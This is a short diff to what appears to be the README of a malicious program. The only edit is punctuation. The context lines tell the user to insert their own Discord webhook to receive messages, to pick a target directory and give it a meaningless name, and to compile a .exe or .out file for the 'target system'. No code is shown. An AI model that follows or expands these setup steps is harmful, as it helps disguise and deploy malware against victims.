@@ -4,4 +4,4 @@ Make sure to change the Discord Webhook and User name of yours to get the msg on
 Also you can customize the directory you want to target and change to meaningless form.
 Make .exe file or .out file according to the target system.
 
-Further code is explained in comments...
+Further code is explained in comments.
